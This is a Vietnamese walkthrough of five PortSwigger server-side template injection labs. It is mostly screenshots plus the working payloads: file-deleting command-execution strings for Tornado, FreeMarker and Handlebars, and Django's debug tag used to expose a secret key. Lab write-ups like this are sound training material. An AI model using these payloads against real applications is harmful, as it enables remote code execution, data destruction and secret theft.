# SSTI

## 1. Basic server-side template injection
https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic

Context: \
![alt text](image.png)

Ta đưa vào intruder để thử các payload SSTI và dùng Grep Extract để lấy đầu ra:\
![alt text](image-1.png)

![alt text](image-2.png)

![alt text](image-3.png)

---

## 2. Basic server-side template injection (code context)
https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context

Context: \

Test thử 1 cú pháp: \
![alt text](image-4.png)

Quay lại trang blog để đọc comment của mình:\
![alt text](image-5.png)

Ta biết nó dùng Tornado template.

![alt text](image-6.png)

Check:\
![alt text](image-7.png)\
![alt text](image-8.png)

Thử với command:\
![alt text](image-9.png)\
![alt text](image-10.png)

Payload: `}}{%+import+os+%}{{+os.popen("rm+/home/carlos/morale.txt").read()+`

## 3. Server-side template injection using documentation
https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation

Context: \
![alt text](image-11.png)\
![alt text](image-12.png)

Check:\
![alt text](image-13.png)

![alt text](image-14.png)

Ta biết được nó dùng FreeMaker

![alt text](image-15.png)

![alt text](image-16.png)

Payload: ` ${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}`

---

## 4. Server-side template injection in an unknown language with a documented exploit
https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit

Context:\
![alt text](image-17.png)

![alt text](image-18.png)

Có vẻ như dùng NodeJS

![alt text](image-19.png)

Tìm hiểu thêm thì ta biết nó dùng Handlebars\
![alt text](image-20.png)

Payload: 
```json
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
---

## 5. Server-side template injection with information disclosure via user-supplied objects
https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects

Context:\
![alt text](image-21.png)

Ta biết được đây là django: \
![alt text](image-22.png)

Đọc các thông tin về django ta biết được khi dùng `{% debug %}` ta có các thông tin của hệ thống:\
![alt text](image-24.png)

Xem secret key:\
![alt text](image-23.png)

---

## 6. 




